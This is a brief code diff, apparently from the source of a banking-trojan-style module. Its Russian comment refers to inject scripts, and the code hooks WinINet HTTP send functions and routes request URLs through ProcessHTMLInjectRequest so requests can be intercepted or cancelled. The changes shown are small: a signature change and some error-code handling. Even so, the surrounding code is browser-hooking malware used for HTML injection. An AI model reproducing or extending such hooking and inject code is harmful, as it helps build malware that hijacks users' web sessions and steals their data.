@@ -394,7 +394,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 
 
 	// Обрабатываем взаимодействие со скриптами инжектов
-	ProcessHTMLInjectRequest(Request->URL, &CancelRequest);
+	ProcessHTMLInjectRequest(Request->URL, false, &CancelRequest);
 	if (CancelRequest)
 		return Request;
 
@@ -502,7 +502,10 @@ BOOL WINAPI HttpSendRequestHandler(BOOL bType, HINTERNET hRequest,
 			ret = REAL_HttpSendRequestW(hRequest, NULL, 0, lpOptional,
 										dwOptionalLength);
 	}
+	else
+		SetLastError(2);
 
+    DWORD Err = GetLastError();
 	return ret;
 }
 
